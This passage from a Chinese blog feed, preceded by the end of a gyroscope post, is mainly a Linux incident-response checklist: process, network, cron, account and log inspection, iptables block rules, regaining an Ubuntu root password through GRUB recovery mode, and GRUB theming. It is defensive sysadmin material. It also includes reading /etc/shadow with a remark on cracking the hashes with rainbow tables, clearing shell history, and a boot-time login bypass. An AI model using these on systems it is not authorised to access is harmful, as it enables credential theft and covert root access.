href="https://haokan.baidu.com/v?pd=wisenatural&amp;vid=9137749961889739084">https://haokan.baidu.com/v?pd=wisenatural&amp;vid=9137749961889739084</a></p><h3 id="手机中的陀螺仪"><a href="#手机中的陀螺仪" class="headerlink" title="手机中的陀螺仪"></a>手机中的陀螺仪</h3><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210901001254405.png" alt="image-20210901001254405"></p><p>手机陀螺仪的工作原理是什么？ - 萌萌战队的回答 - 知乎 <a href="https://www.zhihu.com/question/27216244/answer/2023187705">https://www.zhihu.com/question/27216244/answer/2023187705</a></p><p>这个是手机里面的微型陀螺仪</p><p>本质上就是把物理运动信号转化为数字信号，也是传感器，反过来，也可以通过算法程序来控制转速，从而实现维持平衡</p><p>手机里面这个陀螺仪，涉及到角动量守恒的力学原理，涉及到科里奥利力原理，电路上的对称设计稳流电路，电容的定义式中与位移成正比</p><p>电容充放电就是对应信号状态，应该不是脉冲的，是可以用积分求出来的一个精确数值</p><p>而且本身在高Hz的交变电流下周期小，以每一个小周期为微元计算就可以把角动量转化的非脉冲电压给离散化</p><p>可以达到程序控制的一个精度，就可以用算法来控制，用matlab应该就可以模拟</p>]]></content>
      
      
      <categories>
          
          <category> 奇奇怪怪 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 角动量守恒 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实战Linux应急响应</title>
      <link href="2023/03/30/%E6%8A%98%E8%85%BE%E5%90%A7/%E5%AE%9E%E6%88%98Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
      <url>2023/03/30/%E6%8A%98%E8%85%BE%E5%90%A7/%E5%AE%9E%E6%88%98Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
      
        <content type="html"><![CDATA[<h2 id="Linux应急响应流程"><a href="#Linux应急响应流程" class="headerlink" title="Linux应急响应流程"></a>Linux应急响应流程</h2><h4 id="症状与确认"><a href="#症状与确认" class="headerlink" title="症状与确认"></a>症状与确认</h4><p>cpu飙升</p><p>服务器卡顿</p><p>异常流量</p><p>服务器无法登录</p><p>僵尸网络（肉鸡，变成DDOS的工具）</p><p>挖矿</p><p>dns服务器报毒</p><hr><p><strong>确认</strong></p><p> linux下没有什么工具使用，基本靠手动解决</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">top -c -o %CPU</span><br><span class="line">ps -co pid,ppid,%mem,%cpu,cmd --sort=-%cpu | head -n 5</span><br><span class="line"><span class="meta">#</span><span class="bash">cpu占用前5</span></span><br><span class="line"></span><br><span class="line">lsof -i -PnR #哪个用户使用了哪个PID进行哪些网络通信</span><br><span class="line">ps -ef | grep [特征]</span><br><span class="line">ps aux | grep [PID]     ps aux #显示全部进程</span><br><span class="line">lsof -p [pid]#查看进程打开的文件</span><br><span class="line">lsof -i:[端口]#查看该端口所有的连接情况</span><br><span class="line">md5sum [文件]#计算文件的md5值</span><br><span class="line"></span><br><span class="line">ifconfig 查看eth0中的package，bytes流量情况</span><br></pre></td></tr></table></figure><p>一般情况这几个命令下来能发现点东西</p><h4 id="辅助处置工具"><a href="#辅助处置工具" class="headerlink" title="辅助处置工具"></a>辅助处置工具</h4><p>webshell查杀<br>    河马webshell查杀:<a href="http://www.shellpub.com/">http://www.shellpub.com</a><br>    深信服网站后门检测工具:<a href="http://edr.sangfor.com.cn/tool/WebShellKillerForLinux.tar.gz">http://edr.sangfor.com.cn/tool/WebShellKillerForLinux.tar.gz</a></p><p>病毒/Rootkit查杀<br>    chkrootkit: <a href="http://www.chkrootkit.org/">http://www.chkrootkit.org</a><br>    rkhunter: <a href="http://rkhunter.sourceforge.net/">http://rkhunter.sourceforge.net</a><br>    Clamav: <a href="http://www.clamav.net/download.html">http://www.clamav.net/download.html</a></p><p>综合查杀工具<br>    悬镜: <a href="http://www.xmirror.cn/page/prodon">http://www.xmirror.cn/page/prodon</a></p><p>通常Linux下恶意程序处置，全靠人工解决</p><p>chkrootkit功能:<br>    检测是否被植入后门、木马、rootkit<br>    检测系统命令是否正常<br>    检测登录日志<br>    使用方法:<br>    <a href="http://ftp.pangeia.com.br/download.htm">http://ftp.pangeia.com.br/download.htm</a><br>    tar -zxvf xxxx.tar.gz<br>    cd 文件夹<br>    make sense<br>    ./chkrootkit<br>    开始检查</p><hr><p>Linux下常用安全工具<br>    rkhunter功能:<br>    系统命令(Binary)检测，包括Md5 校验<br>    Rootkit检测<br>    本机敏感目录、系统配置、服务及套间异常检测<br>    三方应用版本检测<br>    使用方法:<br>    Wget <a href="https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gz">https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gz</a><br>    tar -zxvf xxxx.tar.gz<br>    cd 文件夹<br>    ./installer.sh –install<br>    rkhunter -c</p><hr><h4 id="网络行为分析"><a href="#网络行为分析" class="headerlink" title="网络行为分析"></a>网络行为分析</h4><p>who -a</p><p>lsb_release -a        uname -a        hostnamectl    cat /etc/os-release</p><p>netstat -anop  所有的网络连接，可以看到socket连接，带pid</p><p>netstat -utnpl 查看带端口情况</p><p>arp -a 查看arp表，看有没有被arp欺骗</p><p>iptables 封锁和陌生域名的联系</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iptables -A OUTPUT -d 123.123.123.123 -j DROP #屏蔽出方向；使destination（方向） 上的流量全部drop</span><br><span class="line">iptables -A INPUT -s [目标ip] -j DROP#拒绝源头为目标ip的入流量</span><br><span class="line">iptables -I INPUT -p tcp --dport  443 -m string --string &quot;xxx.com&quot; --algo bm -j DROP</span><br><span class="line">iptables -A INPUT -p tcp --deport 80 -m string --string &quot;x.com&quot; --algo bm -j DROP#拒绝连接目标端口80，目标关键字x.com的tcp的入方向连接</span><br><span class="line">iptables -L#查看</span><br></pre></td></tr></table></figure><h4 id="进程检查"><a href="#进程检查" class="headerlink" title="进程检查"></a>进程检查</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ps aux</span><br><span class="line">ps -ef</span><br><span class="line">top -c</span><br><span class="line">htop</span><br><span class="line">lsof -p [pid]</span><br><span class="line">lsof -i</span><br><span class="line">lsof -c</span><br><span class="line"><span class="meta">#</span><span class="bash">隐藏进程</span></span><br><span class="line">ps -ef | awk &#x27;&#123;print&#125;&#x27; | sort -n | uniq &gt;1</span><br><span class="line">ls /proc | sort -n | uniq &gt;2</span><br><span class="line">diff 1 2</span><br></pre></td></tr></table></figure><h4 id="启动项排查"><a href="#启动项排查" class="headerlink" title="启动项排查"></a>启动项排查</h4><p>/etc/init.d/   init是系统启动的第一个进程（详见linux开机流程笔记），rcX中软链接全部指向init.d<br>有的系统在 /etc/xinetd.d/  旧版/etc/inetd.conf</p><p>查看rc.local文件，有时候这个文件会被篡改</p><p>/etc/rc.d/rc[0-6].d</p><p>/etc/profile.d/</p><p>rcX.d<br>/etc/rc.d/rc.local 文件会在 Linux 系统各项服务都启动完毕之后再被运行，Ubuntu 18.04版及以前有该文件，20版本及之后rc.local文件被服务化，与init.d中的rc.local不同</p><p>etc/init.d目录下ls查看目录名，服务启动脚本，比如其中把ssh启动，意味着就可以通过ssh连接过来了，Apache服务脚本启动</p><p>etc/rcXXX.d 目录名 也可能是目录名，数字0-6这些代表目录运行级别</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210620153051413.png" alt="image-20210620153051413"></p><p>K开头的，表示不启动服务，S开头表启动服务，一般S就是系统开机初始化之后要做的任务</p><h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><p>/etc/crontab</p><p>/var/spool/cron/用户名</p><p>/var/spool/anacron/<br>/etc/cron.d/<br>/etc/cron.hourly/</p><p>crontab -l 列出所有的启动项</p><p>crontab -r 删除    -e编辑</p><h4 id="几个常出问题的目录"><a href="#几个常出问题的目录" class="headerlink" title="几个常出问题的目录"></a>几个常出问题的目录</h4><p>/var/spool/cron/下的文件夹都需要关注下</p><p>/etc/cron.d</p><p>/etc/cron.hourly  daily  weekly  monthly这些按照时间启动的  </p><h4 id="服务排查"><a href="#服务排查" class="headerlink" title="服务排查"></a>服务排查</h4><p>cat /etc/services      服务名称  使用端口  协议名称</p><p>1-1024 系统保留，大多数情况只能由root使用</p><p>1024-4999 由客户端自由分配</p><p>5000-65535 由服务端程序自由分配</p><h4 id="服务自启动"><a href="#服务自启动" class="headerlink" title="服务自启动"></a>服务自启动</h4><p>chkconfig –level 2345 httpd on  这里2345是级别</p><p>chkconfig –level 0 服务名 on/off  类似win的msconfig<br>        运行级别<br>        0 关机状态，设置成0会导致开不了机<br>        1 单用户模式，无需密码登录root，kali开机e，ubuntu shift修改找回密码<br>        2 多用户模式，无网络和NFS<br>        3 多用户，完整模式，登录后进入控制台的命令行模式<br>        4 不可用，一般不用。如电池将用尽，切换到该模式做一些设置<br>        5 多用户，带图形界面，登录后进入图形GUI模式<br>        6 重新启动，默认不能设置为6，会无限重启<br>手动开启服务<br>    service nginx start<br>设置开机自启服务<br>    chkconfig –level 2345 nginx on</p><p>如果没有<br>    apt-get install sysv-rc-conf<br>    cp /usr/sbin/sysv-rc-conf /usr/sbin/chkconfig<br>    如果没有<br>    vim /etc/apt/sources.list<br>    deb <a href="http://archive.ubuntu.com/ubuntu/">http://archive.ubuntu.com/ubuntu/</a> trusty main universe restricted multiverse<br>    sudo apt-get update</p><hr><p>关于systemctl<br>    systemctl是RHEL 7 的服务管理工具中主要的工具，它融合之前service和chkconfig的功能于一体。可以使用它永久性或只在当前会话中启用/禁用服务。</p><p>chkconfig –list 查看服务自启动状态  –del删除</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">写个开机服务放到etc/systemd/system下</span></span><br><span class="line"><span class="meta">cat&gt;</span><span class="bash">node_exporter.service&lt;&lt;<span class="string">EOF</span></span></span><br><span class="line">[Unit]</span><br><span class="line">Description=node_exporter Monitoring System</span><br><span class="line">Documentation=node_exporter Monitoring System</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">ExecStart=/root/node_exporter-1.3.1.linux-amd64/node_exporter --web.listen-address=:9100 </span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line">EOF</span><br><span class="line"><span class="meta">#</span><span class="bash">注意EOF前后不要有空</span></span><br></pre></td></tr></table></figure><h4 id="文件检查"><a href="#文件检查" class="headerlink" title="文件检查"></a>文件检查</h4><p>文件完整性检查，有的系统用rpm管理包的话，使用rpm -Va查看所有软件包的变化情况</p><p>敏感目录</p><p>/tmp</p><p>/etc/init.d</p><p>/usr/bin</p><p>/usr/sbin</p><p>/root</p><p>/bin</p><p>/boot</p><p>/sbin</p><p>/etc/passwd</p><p>/etc/shadow</p><p>ls -alt /temp 按时间进行排序</p><p>使用 find / *.py -perm 4777 可以查找到用chmod 777 xxx.py 改变文件权限的文件</p><p>md5sum -b [文件]</p><p>find / -uid 0 -print 查找特权用户文件<br>find / -size +10000k -print 查看文件大于多少大小的<br>find / -name “…” -print<br>ls -al /tmp | grep “Feb 27”<br>find /home/kali -type f -mtime T<br>find / *.jsp -perm 4777<br>whereis [文件名]<br>ls -la<br>du -sh<br>注意关注隐藏文件 .开头的</p><p>ls -al /tmp | grep “Feb 10” 在tmp中寻找所有2月10号的文件   </p><p>inode文件删除<br>    ls -li muma.sh 查看文件编号<br>    find ./* -inum [文件编号] -delete<br>    find ./* -inum [文件编号] -exec rm {} ;<br>    find ./* -inum [文件编号] -exec rm -i {} ;<br>    find ./* -inum [文件编号] -exec rm -f {} ;<br>    find ./* -inum [文件编号] | xargs rm -f</p><h4 id="账号检查"><a href="#账号检查" class="headerlink" title="账号检查"></a>账号检查</h4><p>w  查看某一时刻用户行为</p><p>cat /etc/passwd 记录了所有用户,默认权限644最小权限444</p><p>cat /etc/shadow 中的root记录了加密过的密码(用彩虹表破解)</p><p>less /etc/passwd 用该命令看有没有新增加的用户</p><p>ls -l /etc/passwd</p><p>删除用户</p><p>usermod -L [user]</p><p>userdel [user]</p><p>userdel -r [user]</p><p>删除用户之后，/home目录下的用户名文件夹也删了</p><p>禁用/etc/shadow第二栏!</p><p><strong>用户登录检查</strong></p><p>last 最后登录时间，查看成功的登录 记录在/var/log/wtmp</p><p>lastb 登录失败情况 /var/log/btmp</p><p>lastlog 查看上一次用户登录情况/var/log/lastlog</p><p>last -x reboot 查看重启记录</p><p>last -x shotdown 查看关机记录 /var/log/message</p><h4 id="历史命令检查"><a href="#历史命令检查" class="headerlink" title="历史命令检查"></a>历史命令检查</h4><p>.bash_history</p><p>history 查看历史命令</p><p>history -c 清空历史命令</p><p>cat ~/.bash_history</p><p>cat /etc/hosts 查看host文件 echo $PATH</p><h4 id="处置命令"><a href="#处置命令" class="headerlink" title="处置命令"></a>处置命令</h4><p>chattr +i [目标文件] 锁住crontab</p><p>chmod 000 [目录文件] 去除权限</p><p>lsattr [目标文件]</p><h4 id="日志位置"><a href="#日志位置" class="headerlink" title="日志位置"></a>日志位置</h4><p>linux 的日志目录位置</p><p>/var/log</p><p>日志配置文件</p><p>/etc/rsyslog.conf</p><h2 id="实战之夺回ubuntu登录密码"><a href="#实战之夺回ubuntu登录密码" class="headerlink" title="实战之夺回ubuntu登录密码"></a>实战之夺回ubuntu登录密码</h2><p>有些公司，可以说是没有安全</p><p>员工安全意识薄弱，服务器登录root，密码123456。人家不爆你爆谁？</p><p>居然被小黑阔把服务器密码改了，种了马子</p><p>虽然伤害性不大，但是侮辱性极强</p><p>问题是，如何在不重装系统的前提下夺回密码？</p><hr><p><strong>环境：</strong> <strong>Ubuntu 18.04</strong> 开机grub引导，ROG玩家国度主板，英伟达显卡若干</p><h3 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h3><p>开机，按esc，进入grub命令行模式</p><p><strong>开机，按住shift，按esc</strong>，可以<strong>进入grub菜单</strong>，不小心按多了esc也会进入命令行模式</p><p>Advanced options for Ubuntu 回车</p><p>进入菜单后用<strong>recover mode回车</strong>，使用<strong>root</strong>权限，输入命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -n -o remount,rw /   #因为此时你只有读权限，为了能运行管理员命令，必须重新挂载该shell窗口，赋予写权限</span><br></pre></td></tr></table></figure><p>此时可以运行一小部分命令，包括修改密码的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(sudo) passwd 用户名</span><br></pre></td></tr></table></figure><h3 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h3><p>recover mode时，用e编辑</p><p>把linux行的“recovery nomodeset”更改为“quiet splash rw init=/bin/bash”</p><p>然后f10或者ctrl+X</p><p>输入passwd 账户</p><p>此处实际上是输入不了的，因该是某个packet依赖缺失？</p><p>参考链接<a href="http://www.vzidc.com/news/content/5293.html">http://www.vzidc.com/news/content/5293.html</a></p><hr><h3 id="其他google线索："><a href="#其他google线索：" class="headerlink" title="其他google线索："></a>其他google线索：</h3><ul><li><p>惠普电脑ubuntu18.04，长按F9进入BOOT menu，选择ubuntu之后长按shift并esc进入ubuntu高级模式，然后选择recover mode</p></li><li><p><a href="https://blog.csdn.net/geekqian/article/details/82912518">https://blog.csdn.net/geekqian/article/details/82912518</a> 在grub命令行中输入normal回车，回到开启界面后按一次esc</p></li><li><p>Type <code>normal</code>, hit Enter, and then tap Esc until the menu is displayed. Hitting Esc at this point won’t drop you to the grub command prompt (so don’t worry about hitting Esc too many times). <a href="https://askubuntu.com/questions/381613/how-to-return-from-grub-prompt-to-the-grub-menu">https://askubuntu.com/questions/381613/how-to-return-from-grub-prompt-to-the-grub-menu</a> </p></li><li><p><a href="https://frameboxxindore.com/windows/how-do-i-access-grub-in-ubuntu.html">https://frameboxxindore.com/windows/how-do-i-access-grub-in-ubuntu.html</a> </p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20220505165742140.png" alt="image-20220505165742140"></p></li><li><p><a href="https://blog.csdn.net/qq_44721831/article/details/122182958">https://blog.csdn.net/qq_44721831/article/details/122182958</a> 最终参考的这篇的方案二，但是与文章中的不一样，不需要输入root密码，只需要回车即可。</p></li><li><p>grub的一些命令 <a href="https://teliute.org/linux/Tecli/lesson1/lesson1.html">https://teliute.org/linux/Tecli/lesson1/lesson1.html</a></p></li><li><p>linux运行级别与图形/命令行启动 <a href="https://blog.csdn.net/weixin_42446001/article/details/119269739">https://blog.csdn.net/weixin_42446001/article/details/119269739</a></p></li></ul><h3 id="GRUB"><a href="#GRUB" class="headerlink" title="GRUB"></a>GRUB</h3><p>What is the grub menu?<br>Grub is the boot menu. If you have more than one operating system installed, it allows you to select which one to boot. Grub is also useful for troubleshooting. You can use it to modify the boot arguments or to boot from an older kernel.<br>Source: <a href="https://frameboxxindore.com/windows/how-do-i-access-grub-in-ubuntu.html">https://frameboxxindore.com/windows/how-do-i-access-grub-in-ubuntu.html</a></p><h3 id="设置开机自动进入grub-menu界面"><a href="#设置开机自动进入grub-menu界面" class="headerlink" title="设置开机自动进入grub menu界面"></a>设置开机自动进入grub menu界面</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/default/grub</span><br><span class="line"><span class="meta">#</span><span class="bash">然后把grub_timeout_style=hidden给删除或者注释掉，把grub_cmdline_linux_default修改为text</span></span><br><span class="line">sudo update-grub #重新更新grub配置</span><br></pre></td></tr></table></figure><h3 id="玩转grub配置文件"><a href="#玩转grub配置文件" class="headerlink" title="玩转grub配置文件"></a>玩转grub配置文件</h3><h4 id="etc-default-grub"><a href="#etc-default-grub" class="headerlink" title="/etc/default/grub"></a>/etc/default/grub</h4><p>GRUB的一个简单选项的配置文件，可以改变引导菜单外观。在执行<code>sudo grub-update</code>后使新配置生效。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">GRUB_DEFAULT=0</span><br><span class="line"><span class="meta">#</span><span class="bash">属性：默认启动项</span></span><br><span class="line"><span class="meta">#</span><span class="bash">参数：可以是数字：从0开始（按照开机选择界面的顺序对应）；也可以是saved或者是某一个菜单条目的标题(查专业手册)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">GRUB_HIDDEN_TIMEOUT=0</span></span><br><span class="line"><span class="meta">#</span><span class="bash">属性：是否隐藏菜单（grub2不再使用）</span></span><br><span class="line"><span class="meta">#</span><span class="bash">参数：0：不隐藏，1：隐藏</span></span><br><span class="line"></span><br><span class="line">GRUB_HIDDEN_TIMEOUT_QUIET=true</span><br><span class="line"><span class="meta">#</span><span class="bash">属性：是否显示等待倒计时</span></span><br><span class="line"><span class="meta">#</span><span class="bash">参数：<span class="literal">true</span>：不显示，<span class="literal">false</span>：显示</span></span><br><span class="line"></span><br><span class="line">GRUB_TIMEOUT=0</span><br><span class="line"><span class="meta">#</span><span class="bash">属性：进入默认启动项的等候时间</span></span><br><span class="line"><span class="meta">#</span><span class="bash">参数：单位：秒，默认0，-1表示一直等待</span></span><br><span class="line"></span><br><span class="line">GRUB_DISTRIBUTOR=`lsb_release -i -s 2&gt; /dev/null || echo Debian`</span><br><span class="line"><span class="meta">#</span><span class="bash">属性：由 GRUB 的分发者设置为他们的标识名称。这用于生成更多信息性的菜单条目标题。</span></span><br><span class="line"></span><br><span class="line">GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet splash&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash">属性：内核启动参数的默认值</span></span><br><span class="line"><span class="meta">#</span><span class="bash">参数：quiet splash为不显示启动信息，安静的启动，如值为空则显示启动信息</span></span><br><span class="line"><span class="meta">#</span><span class="bash">说明：除非 GRUB_DISABLE_RECOVERY 被设置为 <span class="literal">true</span>，否则每个 Linux 内核将生成两个菜单项: 一个默认条目和一个恢复模式条目。</span></span><br><span class="line">      此选项列出命令行参数，仅添加到默认菜单条目中，位于 GRUB_CMDLINE_LINUX 中列出的参数之后。</span><br><span class="line"></span><br><span class="line">GRUB_CMDLINE_LINUX=&quot;&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash">属性：手动添加内核启动参数</span></span><br><span class="line"><span class="meta">#</span><span class="bash">参数：默认为空，可以添加你需要的参数，以 “name=value” 的格式添加，多个参数用空格隔开</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">GRUB_TERMINAL=console</span></span><br><span class="line"><span class="meta">#</span><span class="bash">属性：是否使用控制终端(仅限grub-pc)</span></span><br><span class="line"><span class="meta">#</span><span class="bash">参数：默认使用图像界面，去掉前面的“<span class="comment">#”则使用控制台终端</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">GRUB_GFXMODE=640x480</span></span><br><span class="line"><span class="meta">#</span><span class="bash">属性：图形界面分辨率</span></span><br><span class="line"><span class="meta">#</span><span class="bash">参数：“宽x高”或者“宽x高x深”，只能使用图形卡通过 VESA BIOS 扩展 （VBE） 支持的模式，因此可能无法提供本地 LCD 面板分辨率。</span></span><br><span class="line">      可以通过 GRUB 中的&quot;videoinfo&quot;命令&quot;列出。</span><br><span class="line"><span class="meta">#</span><span class="bash">说明：分辨率可以指定为一种或多个模式的序列，按逗号(,)或分号(;)分开,依次尝试，直到找到一个。</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">GRUB_DISABLE_LINUX_UUID=<span class="literal">true</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">属性：是否允许GRUB将“root=UUID=xxx”参数传递给Linux</span></span><br><span class="line"><span class="meta">#</span><span class="bash">参数：<span class="literal">true</span>:允许,注释表示不允许</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">GRUB_DISABLE_RECOVERY=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">属性：是否禁用恢复模式菜单项的生成</span></span><br><span class="line"><span class="meta">#</span><span class="bash">参数：<span class="literal">true</span>:禁用，,注释表示不禁用</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">GRUB_INIT_TUNE=<span class="string">&quot;480 440 1&quot;</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">属性：取消注释可以在grub启动时收到嘟嘟声</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>grub-update的实际作用就是将相应的修改写入到/boot/grub/grub.cfg文件中，因此作为用户是无需直接修改/boot/grub/grub.cfg进行个性化配置的。</p><h4 id="usr-share-grub-default-grub"><a href="#usr-share-grub-default-grub" class="headerlink" title="/usr/share/grub/default/grub"></a>/usr/share/grub/default/grub</h4><p>示例配置文件，当/etc/default/grub配置发生错误时，可以通过它来帮助你恢复初始配置。</p><h4 id="etc-grub-d"><a href="#etc-grub-d" class="headerlink" title="/etc/grub.d"></a>/etc/grub.d</h4><p>/etc/grub.d目录下包含了很多用来配置 GRUB 的shell脚本,这些配置可以在/etc/default/grub配置的基础上进行的更复杂的配置。同样需通过执行sudo grub-update使新配置生效。</p><h4 id="boot-grub-grub-cfg"><a href="#boot-grub-grub-cfg" class="headerlink" title="/boot/grub/grub.cfg"></a>/boot/grub/grub.cfg</h4><p>当对/etc/default/grub配置文件 和 /etc/grub.d目录内复杂的配置文件进行修改并grub-update后，生成的文件就是/boot/grub/grub.cfg，这也是 GRUB 实际使用到的配置文件。</p><h4 id="boot-grub-cfg"><a href="#boot-grub-cfg" class="headerlink" title="/boot/grub.cfg"></a>/boot/grub.cfg</h4><p>即使是root也不要编辑它，它同样在每次update-grub后自动生成。</p><hr><h4 id="个性化设置引导界面"><a href="#个性化设置引导界面" class="headerlink" title="个性化设置引导界面"></a>个性化设置引导界面</h4><h5 id="1-启动菜单背景图"><a href="#1-启动菜单背景图" class="headerlink" title="1.启动菜单背景图"></a>1.启动菜单背景图</h5><p>引导菜单界面将自动搜索/boot/grub/，并将找到的的第一张图片作为引导菜单背景图。<br>如需要使用背景图，建议背景图分辨率和GRUB_GFXMODE保持一致。</p><h5 id="2-添加GRUB主题"><a href="#2-添加GRUB主题" class="headerlink" title="2.添加GRUB主题"></a>2.添加GRUB主题</h5><p>1)下载主题包</p><p>GRUB主题下载网址：<a href="https://www.gnome-look.org/browse?cat=109&amp;ord=latest">https://www.gnome-look.org/browse?cat=109&amp;ord=latest</a><br>两个优秀的GRUB主题：<a href="https://www.gnome-look.org/p/1009236">https://www.gnome-look.org/p/1009236</a> 和 <a href="https://www.gnome-look.org/p/1414997">https://www.gnome-look.org/p/1414997</a> </p><p>2)解压主题包到指定目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hollowman@hollowman-F117:~/下载$ xz -d Vimix-1080p.tar.xz </span><br><span class="line">hollowman@hollowman-F117:~/下载$ sudo mkdir /boot/grub/themes</span><br><span class="line">hollowman@hollowman-F117:~/下载$ sudo tar -xvf Vimix-1080p.tar -C /boot/grub/themes</span><br></pre></td></tr></table></figure><p>3)修改/etc/default/grub配置文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hollowman@hollowman-F117:~/下载$ sudo vim /etc/default/grub</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## 注意以下参数</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> GRUB_TIMEOUT_STYLE=hidden                                 <span class="comment">#注释掉，不然不会出现引导菜单</span></span></span><br><span class="line">GRUB_TIMEOUT=3                                              #不能为0，否则引导菜单还没出现就跳过了</span><br><span class="line">GRUB_GFXMODE=&quot;1920x1080&quot;                                    #请将分辨率和图像大小设置一致</span><br><span class="line">GRUB_THEME=/boot/grub/themes/Vimix-1080p/Vimix/theme.txt    #添加此代码，注意参数应设置主题文件theme.txt的路径</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="4"><li>执行 sudo update-grub</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hollowman@hollowman-F117:~/下载$ sudo update-grub</span><br></pre></td></tr></table></figure><p>注意：优麒麟GRUB主题这样设置是无效的<br>原因分析：优麒麟添加了自定义的主题，配置文件存放在/etc/grub.d/06_ubuntukylin_theme 文件<br>解决办法：打开该文件，找到GRUB_THEME这一行，将其注释并改成你自己的主题路径。执行sudo update-grub生效</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hollowman@hollowman-F117:~/下载$ sudo vim /etc/grub.d/06_ubuntukylin_theme</span><br><span class="line"></span><br><span class="line">...省去上文...</span><br><span class="line"><span class="meta">#</span><span class="bash">GRUB_THEME=/usr/share/grub/themes/UKUI/theme.txt</span></span><br><span class="line">GRUB_THEME=/boot/grub/themes/Vimix-1080p/Vimix/theme.txt</span><br><span class="line">...省去下文...</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h4 